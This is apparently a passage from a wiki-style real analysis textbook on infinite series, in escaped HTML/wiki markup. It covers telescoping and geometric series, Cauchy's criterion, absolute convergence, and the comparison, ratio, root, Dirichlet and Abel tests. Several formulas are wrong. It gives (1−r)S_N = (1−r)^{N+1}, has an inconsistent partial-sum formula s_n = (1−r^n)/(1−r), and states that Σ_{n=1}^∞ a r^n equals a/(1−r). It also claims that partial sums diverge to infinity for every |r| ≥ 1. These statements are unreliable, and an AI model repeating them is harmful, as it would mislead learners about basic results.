1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;1&amp;nbsp;&amp;minus;&amp;nbsp;1&amp;nbsp;+&amp;nbsp;…&amp;nbsp;=&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;1)&amp;nbsp;+&amp;nbsp;….  It is no longer true that for infinite series that we may sum in any order we choose, we would need to justify why we are allowed to group the +1's together with the -1's without changing the sum.  We will investigate when it is possible to rearrange the elements of a series and still get the same sum.
&lt;li&gt; Perhaps the most familiar examples of series come from decimal expansions or real numbers. While we have not given a rigorous definition of decimal expansions here, it can be shown that every real number ''r'' can be expressed in the form &lt;math&gt;\textstyle r = \sum_{n=0}^{\infty} \frac{a_n}{10^n}&lt;/math&gt; where ''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;&amp;isin;&amp;nbsp;{0,&amp;nbsp;1,&amp;nbsp;2,&amp;nbsp;3,&amp;nbsp;4,&amp;nbsp;5,&amp;nbsp;6,&amp;nbsp;7,&amp;nbsp;8,&amp;nbsp;9}
&lt;li&gt;Consider the series &lt;math&gt;\textstyle \tfrac{1}{1\cdot 2}+\tfrac{1}{2\cdot 3}+\tfrac{1}{3\cdot 4}\cdots=\sum_{n=1}^\infty\tfrac{1}{n(n+1)}&lt;/math&gt;.  At first it may seem difficult to determine the partial sums and decide whether or not the series converges.  It turns out this series is nicer then it first appears, this is because &lt;math&gt;\textstyle \frac{1}{n(n+1)}=\frac{1}{n}-\frac{1}{n+1}.&lt;/math&gt;  Thus &lt;br&gt;&lt;br&gt;


:&lt;math&gt;\sum_{n=1}^N \frac{1}{n(n+1)}=\sum_{n=1}^N \frac{1}{n}-\frac{1}{n+1}=1-\frac{1}{2}+\frac{1}{2}-\frac{1}{3}+\frac{1}{3}-\frac{1}{4}+\cdots+\frac{1}{N}-\frac{1}{N+1}=1-\frac{1}{N+1}.&lt;/math&gt; 
&lt;br&gt;

Thus &lt;math&gt;\textstyle \lim_{N\to\infty}\sum_{n=1}^N\tfrac{1}{n(n+1)}=\lim_{N\to\infty}(1-\tfrac{1}{N+1})=1.&lt;/math&gt;  This is an example of a '''telescoping series''', that is a series that can be written in the form where the next term cancels with the previous terms.  That is, 
:&lt;math&gt;\sum_{n=1}^{\infty}a_n-a_{n+1}&lt;/math&gt;
For all such series the partial sums are given by ''S''&lt;sub&gt;''N''&lt;/sub&gt;&amp;nbsp;=&amp;nbsp;''a''&lt;sub&gt;1&lt;/sub&gt;&amp;nbsp;&amp;minus;&amp;nbsp;''a''&lt;sub&gt;''N''+1&lt;/sub&gt;, that is the terms of the series collapse like a telescope, leaving only the first and last.  Such a series converges to ''a''&lt;sub&gt;''1''&lt;/sub&gt;&amp;nbsp;&amp;minus;&amp;nbsp;lim&amp;nbsp;''a''&lt;sub&gt;''N''+1&lt;/sub&gt;.
&lt;li&gt; Another important example of a series is a the '''geometric series''' given by &lt;math&gt;\sum_{n=0}^{\infty} r^n &lt;/math&gt;.  The partial sums for the geometric series first appear quite complicated, at first glance the partial sums would just appear to be ''S''&lt;sub&gt;''N''&lt;/sub&gt;&amp;nbsp;=&amp;nbsp;1&amp;nbsp;+&amp;nbsp;''r''&amp;nbsp;+''r''&lt;sup&gt;2&lt;/sup&gt;&amp;nbsp;+&amp;nbsp;…&amp;nbsp;+&amp;nbsp;''r''&lt;sup&gt;''N''&lt;/sup&gt;, but if we calculate (1&amp;nbsp;&amp;minus;&amp;nbsp;''r'')''S''&lt;sub&gt;N&lt;/sub&gt; then the sum telescopes and we are left with (1&amp;nbsp;&amp;minus;&amp;nbsp;''r'')''S''&lt;sub&gt;N&lt;/sub&gt;&amp;nbsp;=&amp;nbsp;(1&amp;nbsp;&amp;minus;&amp;nbsp;''r'')&lt;sup&gt;''N''+1&lt;/sup&gt;.  Notice that this sum holds for any ''r'' or ''N'', so we conclude that &lt;math&gt;\textstyle S_N=\tfrac{1-r^{N+1}}{1-r}&lt;/math&gt;.  Thus a geometric series converges if |''r''|&amp;nbsp;&amp;lt;&amp;nbsp;1.
&lt;/ul&gt;

&lt;!-- 
* Alternating Series: Any series of the form &lt;math&gt; \sum_{n=1}^{\infty} (-1)^n a_n&lt;/math&gt;, where for all i, &lt;math&gt;a_i \geq 0&lt;/math&gt;  is called an alternating series.  

* p-series: Any series of the form &lt;math&gt; \sum_{n=1}^{\infty} \frac{1}{n^p}&lt;/math&gt; is called a p-series.  This kind of series is generally harder to evaluate than the two previously discussed.  When p=2, for example, we get the amazing identity &lt;math&gt; \sum_{n=1}^{\infty} \frac{1}{n^2} = \frac{\pi^2}{6}&lt;/math&gt;.  That takes considerable effort to prove, so for the moment we will content ourselves with showing that &lt;math&gt; \sum_{n=1}^{\infty} \frac{1}{n^p}&lt;/math&gt; diverges for p &lt;math&gt;\leq&lt;/math&gt; 1 and converges for p&gt;1. 

* Power Series: These should be familiar to anyone who has taken calculus.  A power series is actually a function &lt;math&gt;f&lt;/math&gt; that takes a real number &lt;math&gt;x&lt;/math&gt; and returns a series, &lt;math&gt; f(x) = \sum_{n=0}^{\infty} a_n x^n&lt;/math&gt;.  These, along with Fourier Series, will be examined in detail in a later chapter of the book, once we have covered sequences and series of functions.

* Fourier Series: Like power series, these are functions that take a real number and return a series.  However, the terms are trigonometric functions rather than powers of x.  The general expression for a Fourier series is: &lt;math&gt;f(x) = a_0 + \sum_{n=1}^{\infty} a_n cos(nx) + b_n sin(nx)&lt;/math&gt;.

==Basic Facts==

Here we collect facts about series that follow immediately from the properties of finite sums a limits and do not require a delicate analysis of the limits involved.
   
===Theorem (Algebraic Operations)===
Suppose &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; and &amp;sum;&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; are convergent series, then we immediately have the following two theorems.

* For any real number ''c'' the series &amp;sum;&amp;nbsp;(''c''&amp;middot;''a''&lt;sub&gt;''n''&lt;/sub&gt;) is convergent and converges to ''c''&amp;middot;(&amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt;).
* The series &amp;sum;&amp;nbsp;(''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;+&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt;) is convergent and converges to (&amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;)&amp;nbsp;+&amp;nbsp;(&amp;sum;&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;)

====Proof====
For the first statement notice that for any natural number ''N'', we have that &lt;math&gt;\textstyle \sum_{n=1}^N c\cdot a_n=\textstyle c\cdot \sum_{n=1}^N a_n&lt;/math&gt;.  Thus 
:&lt;math&gt;\lim_{N\to\infty}\sum_{n=1}^N c\cdot a_n=\lim_{N\to\infty}c\cdot \sum_{n=1}^N a_n=c\cdot \lim_{N\to\infty}\sum_{n=1}^N a_n&lt;/math&gt;.
This proves the first statement.

For the second statement again notice that for any ''N'' we have that &lt;math&gt;\textstyle \sum_{n=1}^N a_n+b_n=\sum_{n=1}^N a_n+\sum_{n=1}^N b_n&lt;/math&gt;.  Thus
:&lt;math&gt;\lim_{N\to\infty}\sum_{n=1}^N a_n+b_n=\lim_{N\to\infty}\left(\sum_{n=1}^N a_n+\sum_{n=1}^N b_n\right)=\lim_{N\to\infty}\sum_{n=1}^N a_n+\lim_{N\to\infty}\sum_{n=1}^N b_n&lt;/math&gt;.
This proves the second statement. &lt;math&gt;\Box&lt;/math&gt;


The following is merely a restatement of Cauchy's Criterion.

===Theorem (Cauchy's Criterion for Series)===
A series &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; converges if and only if for any &amp;epsilon;&amp;nbsp;&amp;gt;&amp;nbsp;0 there is a natural number ''N'' so that 
&lt;math&gt;\textstyle |\sum_{k=n+1}^m a_k| &lt; \epsilon&lt;/math&gt; for any natural numbers   ''m''&amp;nbsp;&amp;gt;&amp;nbsp;''n''&amp;nbsp;&amp;gt;&amp;nbsp;''N''.

====Proof====

By the definition of convergence for a series &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; converges if and only if &lt;math&gt;\textstyle\lim_{N\to\infty}\sum_{k=1}^N a_k&lt;/math&gt; converges.  But by the Cauchy criterion for sequences this limit exists if and only if for any &amp;epsilon;&amp;nbsp;&amp;gt;&amp;nbsp;0 we can find a natural number ''N'' so that for ''n'',&amp;nbsp;''m''&amp;nbsp;&amp;gt;&amp;nbsp;''N'' we have that
:&lt;math&gt;\left|\sum_{k=1}^n a_k-\sum_{k=1}^m a_k\right|&lt;\epsilon.&lt;/math&gt;
Without loss of generality we may assume ''m''&amp;nbsp;&amp;gt;&amp;nbsp;''n''.  Canceling the terms that occurs in both sums completes the proof. &lt;math&gt;\Box&lt;/math&gt;

==Absolute Convergence==

As we will see series may behave in ways that defy our intuition.  So, it is useful to identify which classes of convergent series behave in a way more consistent with our intuition.  We shall see that once such class of series are the so called ''absolutely convergent'' series.

:'''Definition''' A series &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; ''converges absolutely'' if the series of the absolute values of its terms converges,  that is, if &lt;math&gt;\textstyle\sum_{n=1}^{\infty} |a_n|&lt;/math&gt; is a convergent series.  

Notice we have not said required that &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; is convergent, this is because the property of absolute convergence implies that &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; is convergent.

===Theorem (Absolute Convergence)===
If &lt;math&gt;\textstyle\sum_{n=1}^{\infty} a_n&lt;/math&gt; converges absolutely, then it converges.

====Proof====

Suppose &lt;math&gt;\textstyle\sum_{n=1}^{\infty} a_n&lt;/math&gt; is absolutely convergent.  By the Cauchy criterion we can show that &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt; converges if for any ε&amp;nbsp;&gt;&amp;nbsp;0 we can find an ''N'' so that if ''m''&amp;nbsp;&gt;&amp;nbsp;''n''&amp;nbsp;&gt;&amp;nbsp;''N'' then &lt;math&gt;\textstyle |\sum_{k=n+1}^{m} a_k|&lt;\epsilon&lt;/math&gt;.  But we know that &lt;math&gt;\textstyle \sum_{n=1}^\infty |a_n|&lt;/math&gt; converges, so ε&amp;nbsp;&gt;&amp;nbsp;0 by the Cauchy criterion choose ''N'' so that if ''m''&amp;nbsp;&gt;&amp;nbsp;''n''&amp;nbsp;&gt;&amp;nbsp;''N'' then &lt;math&gt;\textstyle |\sum_{k=n+1}^{m} |a_k||=\textstyle \sum_{k=n+1}^{m} |a_k|&lt;\epsilon&lt;/math&gt;.  With this ''N'' in hand take any ''m''&amp;nbsp;&gt;&amp;nbsp;''n''&amp;nbsp;&gt;&amp;nbsp;''N'', it then follows from the triangle inequality that
:&lt;math&gt;|\sum_{k=n+1}^m a_k|\leq \sum_{k=n+1}^m |a_k|&lt; \epsilon.&lt;/math&gt;
Therefore by the Cauchy criterion &lt;math&gt;\sum_{n=1}^\infty a_n&lt;/math&gt; converges. &lt;math&gt;\Box&lt;/math&gt;

== Tests for convergence and divergence ==
Given a series &lt;math&gt;\textstyle \sum_{n=1}^\infty a_n&lt;/math&gt; it is very useful to be able to tell if the series converges or diverges.  Particularly if we can do so simply by looking at the terms.  In this section we set out to collect such theorems.  Notice we have already seen one example.  That is a series is convergent if it is absolutely convergent, now we explore when we can decide if a series is convergent.

Although the following theorem is stated in terms of convergence, it actually gives a useful test for divergence.  Namely, if the terms of a series do not have limit 0, the series must diverge.

===Theorem (Terms Have Limit 0)===
For any converging series &lt;math&gt;\textstyle\sum_{n=1}^{\infty} a_n&lt;/math&gt; the terms must tend to 0, that is &lt;math&gt;\textstyle \lim_{n\rightarrow \infty} a_n = 0. &lt;/math&gt;

====Proof====
Given any &amp;epsilon;&amp;nbsp;&amp;gt;&amp;nbsp;0, by the Cauchy Criterion for series, we can choose a natural number ''N'' so that &lt;math&gt;\textstyle |\sum_{i=n+1}^m a_i|&lt;\epsilon&lt;/math&gt; when ever ''m''&amp;nbsp;&amp;gt;&amp;nbsp;''n''&amp;nbsp;&amp;ge;&amp;nbsp;''N''. In particular, for any ''k''&amp;nbsp;&amp;gt;&amp;nbsp;''N'' we may apply this in the case when ''n''&amp;nbsp;=&amp;nbsp;''k''&amp;nbsp;&amp;minus;&amp;nbsp;1 and ''m''&amp;nbsp;=&amp;nbsp;''k''.  In this case the sum reduces to the single term ''a''&lt;sub&gt;''k''&lt;/sub&gt;.  Thus if ''k''&amp;nbsp;&amp;gt;&amp;nbsp;''N''  we have that |''a''&lt;sub&gt;''k''&lt;/sub&gt;|&amp;nbsp;&amp;lt;&amp;nbsp;&amp;epsilon; and therefore the sequence (''a''&lt;sub&gt;''n''&lt;/sub&gt;)&amp;nbsp;→&amp;nbsp;0. &lt;math&gt;\Box&lt;/math&gt;

'''Remark''' To give an example of how to use this to test for divergence of a series consider the example of a geometric series &lt;math&gt;\textstyle \sum_{n=0}^\infty r^n&lt;/math&gt;.  We have already shown that this series converges if |''r''|&amp;nbsp;&lt;&amp;nbsp;1.  On the other hand we have not determined if the series converges or diverges for other values of ''r''.  Now it is clear that if |''r''|&amp;nbsp;≥&amp;nbsp;1 then the sequence ''r''&lt;sub&gt;''n''&lt;/sup&gt; does not tend to zero.  So we now know that the geometric series &lt;math&gt;\textstyle \sum_{n=0}^\infty r^n&lt;/math&gt; converges if and only of |''r''|&amp;nbsp;&lt;&amp;nbsp;1.

===Theorem (Positive Series Converge)===
Suppose &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; is a series of non-negative terms, that is ''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;&amp;ge;&amp;nbsp;0, then the series either converges if and only if the partial sums are bounded above.
====Proof====

Since the terms are non-negative, we clearly have &lt;math&gt;\textstyle \sum_{n=1}^N a_n \leq \sum_{n=1}^{N+1} a_n&lt;/math&gt; and hence the partial sums form a monotonic sequence.  If the partial sums are bounded then the series converges.  If they are unbounded, then for any ''M''&amp;nbsp;&amp;gt;&amp;nbsp;0 we can find an ''N'' so that &lt;math&gt;\textstyle \sum_{n=1}^N a_n \geq M&lt;/math&gt;, since the partial sums are non-decreasing, we have that &lt;math&gt;\textstyle\lim_{N \rightarrow \infty}\sum_{n=1}^N a_n = \infty &lt;/math&gt;, and hence the series does not converge. &lt;math&gt;\Box&lt;/math&gt;

'''Remark''' It follows from the proof, together with the Convergence of monotone sequences, that if a sequence of non-negative terms converges we may take the sum of the sequence as an upper bound for the partial sums, as our intuition would dictate.  

To determine whether or not a series converges, sometimes it is useful to compare it term-by-term with another series whose convergence is understood.  The following theorem gives one such method for comparing.

===Theorem (Comparison Test)===

Suppose that 0&amp;nbsp;≤&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;≤&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; for all natural numbers ''n'' and consider the series &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n &lt;/math&gt; and &lt;math&gt;\textstyle \sum_{n=1}^{\infty} b_n
&lt;/math&gt;.  If the &lt;math&gt;\textstyle \sum_{n=1}^{\infty} b_n&lt;/math&gt; converges, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; converges.  Furthermore, if &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; diverges, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} b_n &lt;/math&gt; diverges.

====Proof====
First suppose that the &amp;sum;&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; converges.  Then by our previous theorem we know that the partial sums for some real number we know that &lt;math&gt;\textstyle\sum_{n=1}^N b_n\leq\sum_{n=1}^\infty b_n&lt;/math&gt;.  Since ''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;≤&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; if follows that 
:&lt;math&gt;\sum_{k=1}^{N} a_n \leq \sum_{k=1}^{N} b_n \leq \sum_{n=1}^{\infty} b_n &lt;/math&gt;.  
Thus the partial sums of &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; are bounded above, since &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; is also a series of non-negative terms it follows that &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; converges.

Now suppose that &amp;sum;&amp;nbsp;''a''&lt;sub&gt;''n''&lt;/sub&gt; diverges.  Since it is a series of non-negative terms the pervious theorem tells us that for any real number ''M'' we can find an ''N'' so that &lt;math&gt;\textstyle M&lt;\sum_{n=1}^N a_n&lt;/math&gt;.  Since ''a''&lt;sub&gt;''n''&lt;/sub&gt;&amp;nbsp;≤&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; we have that
:&lt;math&gt;M&lt;\sum_{k=1}^{N} a_n \leq \sum_{k=1}^{N} b_n&lt;/math&gt;.  
Therefore the partial sums of &amp;sum;&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; cannot be bounded above, and hence by the previous theorem &amp;sum;&amp;nbsp;''b''&lt;sub&gt;''n''&lt;/sub&gt; diverges. &lt;math&gt;\Box&lt;/math&gt;

===Theorem (Limit Comparison Test)===
Suppose &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n &lt;/math&gt; and &lt;math&gt;\textstyle \sum_{n=1}^{\infty} b_n&lt;/math&gt; series of positive terms so that &lt;math&gt;\textstyle 0\leq\limsup_{n\to\infty} \tfrac{a_n}{b_n}&lt;\infty&lt;/math&gt;.  In this case, if &lt;math&gt;\textstyle \sum_{n=1}^{\infty} b_n &lt;/math&gt; converges, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} a_n&lt;/math&gt; converges.  

====Proof====
Suppose the limit of the absolute value of their ratios converges to some positive number ''r''&amp;nbsp;&amp;lt;&amp;nbsp;&amp;infin;. Then there exists an ''N'' such that if ''n''&amp;nbsp;&amp;gt;&amp;nbsp;''N'', that &lt;math&gt;|\,|\tfrac{a_n}{b_n}|-r|&lt;\tfrac{r}{2}&lt;/math&gt;, so &lt;math&gt;\tfrac{r}{2}&lt;|\tfrac{a_n}{b_n}|&lt;\tfrac{3r}{2}&lt;/math&gt;. This means that &lt;math&gt;\tfrac{r}{2}|b_n|&lt;|a_n|&lt;\tfrac{3r}{2}|b_n|&lt;/math&gt;. Hence, by the comparison test, if &lt;math&gt;\sum_{n=1}^{\infty} b_n&lt;/math&gt; converges, then &lt;math&gt;\sum_{n=1}^{\infty} a_n &lt;/math&gt; also converges. Dividing by &lt;math&gt;\tfrac{r}{2}&lt;/math&gt;, one can also see by the comparison test that if &lt;math&gt;\sum_{n=1}^{\infty} a_n &lt;/math&gt; converges, then &lt;math&gt;\sum_{n=1}^{\infty} b_n &lt;/math&gt; also converges.


We need to have ways of checking for convergence and divergence of various series.  The following types of series arise quite often, and it is easy to verify when they converge and diverge:

===Theorem (Ratio Test)===
Supoose that &lt;math&gt;\textstyle \lim_{n \rightarrow \infty} \left|\frac{x_{n+1}}{x_n}\right|&lt;/math&gt; converges and equals some real number ''r''.  If ''r''&amp;nbsp;&lt;&amp;nbsp;1, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} x_n&lt;/math&gt; converges absolutely.  If ''r''&amp;nbsp;&gt;&amp;nbsp;1, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} x_n &lt;/math&gt; diverges. Finally, if ''r''&amp;nbsp;=&amp;nbsp;1, then &lt;math&gt;\textstyle \sum_{n=1}^{\infty} x_n&lt;/math&gt; may either converge or diverge.

====Proof==== 

First suppose that ''r''&amp;nbsp;&lt;&amp;nbsp;1.  Let ε&amp;nbsp;=&amp;nbsp;1&amp;nbsp;&amp;minus;&amp;nbsp;''r'', since ''r''&amp;nbsp;&lt;&amp;nbsp;1 it follows that ε&amp;nbsp;&gt;&amp;nbsp;0.  

Since &lt;math&gt;\textstyle\lim_{n \rightarrow \infty} \left|\frac{x_{n+1}}{x_n}\right| = r &lt;/math&gt;, we can choose an ''N'' so that |&amp;thinsp;|''x''&lt;sub&gt;''n''+1&lt;/sub&gt;/''x''&lt;sub&gt;''n''&lt;/sub&gt;|&amp;nbsp;&amp;minus;&amp;nbsp;r|&amp;nbsp;&lt;&amp;nbsp;ε/2 for all ''n''&amp;nbsp;&amp;ge;&amp;nbsp;''N''.  In particular, if ''n''&amp;nbsp;&amp;ge;&amp;nbsp;''N'', then  |''x''&lt;sub&gt;''n''+1&lt;/sub&gt;|/|''x''&lt;sub&gt;''n'&lt;/sub&gt;|&amp;nbsp;&lt;&amp;nbsp;''r''&amp;nbsp;+&amp;nbsp;ε/2.  Notice that our particular choice of ε guarantees that the ratio ''r''&amp;nbsp;+&amp;nbsp;ε/2 is less than 1.
  
Thus 
:&lt;math&gt; \sum_{n=1}^{\infty} |x_n| &lt;/math&gt; = &lt;math&gt; \sum_{n=1}^{N} |x_n| +  \sum_{n=N+1}^{\infty} |x_n|&lt;/math&gt;

:&lt;math&gt; = \sum_{n=1}^N |x_n| +  \sum_{n=N+1}^{\infty} |x_N|\frac{|x_{N+1}|}{|x_N|}\frac{|x_{N+2}|}{|x_{N+1}|}\cdots\frac{|x_{n}|}{|x_{n-1}|}&lt;/math&gt;

:&lt;math&gt;\leq \sum_{n=1}^N |x_n| +  |x_N|\sum_{n=N+1}^{\infty}(r + \frac{\epsilon}{2})^{n-N}.&lt;/math&gt; 

The last series converges because it is a geometric series whose ratio,  ''r''&amp;nbsp;+&amp;nbsp;ε/2&amp;nbsp;, is less than 1.  

By the comparison test, &lt;math&gt;\textstyle\sum_{n=1}^{\infty} |x_n| &lt;/math&gt; converges.  
Thus &lt;math&gt;\textstyle\sum_{n=1}^{\infty} x_n &lt;/math&gt; converges absolutely.  &lt;math&gt;\Box&lt;/math&gt;


The next theorem, the root test, is stronger than the ratio test in the sense that it works whenever the ratio test works (and returns the same number r), and it sometimes works even when the ratio test does not.

===Theorem (Root Test)===

Let &lt;math&gt;R = \limsup_{n\rightarrow\infty}(|a_n|^{\frac{1}{n}})&lt;/math&gt;.  If R &lt; 1, then the series &lt;math&gt;\sum_{n=1}^{\infty}a_n&lt;/math&gt; converges absolutely.  If R &gt; 1, then it diverges.

====Proof====

If R&lt;1, let &lt;math&gt;R&lt;\rho&lt;1&lt;/math&gt;.  Since &lt;math&gt;\limsup_{n\rightarrow\infty}(|a_n|^{\frac{1}{n}}) = R&lt;/math&gt;  &lt;math&gt;\exists N: \forall n \geq N:  |\sup\{|a_k|^{\frac{1}{k}}|k &gt; n\} - R| &lt; \rho - R&lt;/math&gt;.  

That is, &lt;math&gt;\forall n \geq N: \sup\{|a_k|^{\frac{1}{k}}|k &gt; n\} &lt; \rho&lt;/math&gt;

Thus &lt;math&gt;\sum_{n=1}^{\infty}|a_n| &lt;/math&gt;&lt;math&gt;= \sum_{n=1}^{\infty}(|a_n|^{\frac{1}{n}})^n &lt;/math&gt;&lt;math&gt;= \sum_{n=1}^{N-1}|a_n| + \sum_{n=N}^{\infty}(|a_n|^{\frac{1}{n}})^n &lt;/math&gt;&lt;math&gt; &lt; \sum_{n=1}^{N-1}|a_n| + \sum_{n=N}^{\infty}(\sup\{|a_k|^{\frac{1}{k}}|k &gt; n \})^n &lt;/math&gt;&lt;math&gt;&lt; \sum_{n=1}^{N-1}|a_n| + \sum_{n=N}^{\infty}(\rho)^n&lt;/math&gt;, which converges since it is a constant plus a geometric series.

By the comparison test, &lt;math&gt;\sum_{n=1}^{\infty}|a_n| &lt;/math&gt; converges as well. Thus &lt;math&gt;\sum_{n=1}^{\infty}a_n &lt;/math&gt; converges absolutely. 


If R &gt; 1, then &lt;math&gt;\sup\{|a_n|^{\frac{1}{n}} | k&gt;n\} &gt; 1&lt;/math&gt;.  Thus there are infinitely many n such that &lt;math&gt;|a_n|^{\frac{1}{n}} &gt; 1 \implies |a_n| &gt; 1 &lt;/math&gt;.  

Thus &lt;math&gt; (a_n) \not\rightarrow 0&lt;/math&gt;, which implies that &lt;math&gt;\sum_{n=1}^{\infty}a_n&lt;/math&gt; diverges. &lt;math&gt;\Box&lt;/math&gt;


We'll often be asked to consider series of the form &lt;math&gt;\sum_{n=1}^{\infty} a_nb_n &lt;/math&gt;.  The following theorems give criteria for convergence of these series.

===Theorem (Dirichlet's Test)===

If the partial sums &lt;math&gt;\sum_{n=1}^{N}x_n&lt;/math&gt; are bounded, and &lt;math&gt;(y_n)&lt;/math&gt; is a decreasing sequence with &lt;math&gt;\lim_{n\rightarrow\infty} y_n = 0&lt;/math&gt;, then &lt;math&gt;\sum_{n=1}^{\infty}x_ny_n&lt;/math&gt; converges. [Note: &lt;math&gt;\sum_{n=1}^{\infty}x_n&lt;/math&gt; need not converge]

====Proof====

Let &lt;math&gt;s_n = \sum_{m=1}^n x_m&lt;/math&gt; be the &lt;math&gt;n&lt;/math&gt;th partial sum, so that there exists &lt;math&gt;B&gt;0&lt;/math&gt; such that &lt;math&gt;|s_n| \le B&lt;/math&gt;.

We can write

&lt;math&gt;\sum_{n=1}^N x_ny_n = x_1y_1 + \sum_{n=2}^N (s_n-s_{n-1})y_n = x_1y_1 + \sum_{n=2}^N s_ny_n - \sum_{n=2}^N s_{n-1}y_n&lt;/math&gt;.

Changing the index of summation in the last sum, this becomes

&lt;math&gt;\sum_{n=1}^N x_ny_n = x_1y_1 + \sum_{n=2}^N s_ny_n - \sum_{n=1}^{N-1} s_ny_{n+1} = x_1y_1 - x_1y_2
 + \sum_{n=2}^{N-1} s_n(y_n-y_{n+1}) + s_Ny_N&lt;/math&gt;.

The sum on the right-hand side is bounded absolutely by the telescoping sum

&lt;math&gt;\sum_{n=2}^{N-1} |s_n(y_n-y_{n+1})| \le B \sum_{n=2}^{N-1} (y_n-y_{n+1}) = B(y_2-y_N) \le By_2&lt;/math&gt;;

here we have used the fact that &lt;math&gt;(y_n)&lt;/math&gt; is positive and decreasing. It follows that

&lt;math&gt;\sum_{n=2}^\infty s_n(y_n-y_{n+1})&lt;/math&gt; is absolutely convergent, hence convergent.

Notice that &lt;math&gt;\lim_{N\to\infty} s_Ny_N = 0&lt;/math&gt; since &lt;math&gt;s_N&lt;/math&gt; is bounded and &lt;math&gt;(y_n)&lt;/math&gt; tends to 0 as &lt;math&gt;n&lt;/math&gt; tends to infinity. Therefore we can take limits as &lt;math&gt;N&lt;/math&gt; goes to infinity:

&lt;math&gt;\sum_{n=1}^\infty x_ny_n = x_1y_1 - x_1y_2 + \sum_{n=2}^\infty s_n(y_n-y_{n+1}) + \lim_{N\to\infty} s_Ny_N = x_1y_1 - x_1y_2 + \sum_{n=2}^\infty s_n(y_n-y_{n+1})&lt;/math&gt;,

which proves that the left-hand side is convergent.

Abel's Test can be regarded as a special case of Dirichlet's Test, once some modifications have been made:

===Theorem (Abel's Test)===

If &lt;math&gt;\sum_{n=1}^{\infty}x_n&lt;/math&gt; converges and &lt;math&gt;(y_n)&lt;/math&gt; is a positive, decreasing sequence, then &lt;math&gt;\sum_{n=1}^{\infty}x_ny_n&lt;/math&gt; converges.

====Proof====

Because &lt;math&gt;(y_n)&lt;/math&gt; is a bounded, monotone sequence, it converges to some limit y.

Let &lt;math&gt;z_n = y_n - y&lt;/math&gt;.  Then &lt;math&gt;\sum_{n=1}^{\infty}x_n&lt;/math&gt; and &lt;math&gt;(z_n)&lt;/math&gt; satisfy the conditions for Dirichlet's test.

&lt;math&gt;\sum_{n=1}^{k}x_ny_n&lt;/math&gt;&lt;math&gt; = y\sum_{n=1}^{k}x_n + \sum_{n=1}^{k}x_nz_n&lt;/math&gt;.  By Dirichlet's test, &lt;math&gt;\sum_{n=1}^{k}x_nz_n&lt;/math&gt; converges as &lt;math&gt;k \rightarrow \infty&lt;/math&gt;.

Since both sums on the right converge, &lt;math&gt;\sum_{n=1}^{\infty}x_ny_n&lt;/math&gt; converges as well. &lt;math&gt;\Box&lt;/math&gt;

==Examples with Proof==

Now we'll do the computations promised in the Examples, plus a few extra.

===Theorem (Geometric Series)===

If &lt;math&gt;|r|&lt;1&lt;/math&gt;, the geometric series &lt;math&gt; \sum_{n=1}^{\infty} a r^n = \frac{a}{1-r}&lt;/math&gt;.  If &lt;math&gt;|r| \geq 1&lt;/math&gt;, the series diverges.

====Proof====
In this case, it is best to explicitly compute the partial sums and take the limit.  Without loss of  generality, we'll consider the case &lt;math&gt;a = 1&lt;/math&gt;. Then we can apply the theorem on algebraic operations to obtain the general result.

Note that &lt;math&gt;s_n(1-r) = (1 + r + r^2 + ... + r^n)(1-r) = (1 + r + r^2 + ... + r^n) - (r + r^2 + ... + r^{n+1}) = 1 - r^{n+1}&lt;/math&gt;

Thus &lt;math&gt; s_n = \frac{1-r^n}{1-r} &lt;/math&gt;. Taking the limit (and remembering some basic facts about sequences):

If &lt;math&gt;|r| &lt; 1&lt;/math&gt;, &lt;math&gt;\sum_{n=1}^{\infty} r^n = \lim_{n \rightarrow \infty} s_n =  \lim_{n \rightarrow \infty} \frac{1-r^n}{1-r} = \frac{1}{1-r}&lt;/math&gt;.  

If &lt;math&gt;|r| \geq 1&lt;/math&gt;, the sequence of partial sums diverges to infinity, and thus by definition the series diverges. 

